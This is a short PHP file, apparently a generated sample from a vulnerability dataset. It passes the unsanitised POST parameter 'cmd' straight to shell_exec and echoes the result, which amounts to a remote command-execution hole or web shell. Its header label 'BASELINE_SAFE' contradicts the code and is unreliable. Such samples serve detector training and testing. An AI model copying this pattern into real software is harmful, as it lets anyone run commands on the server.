<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY_ISSET; SKELETON=S0; KEY=cmd; SINK=B3; VAR=v0087 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$p = $_POST;
$inp = isset($p["cmd"]) ? (string)$p["cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B3($inp);
echo (string)($out);
?>
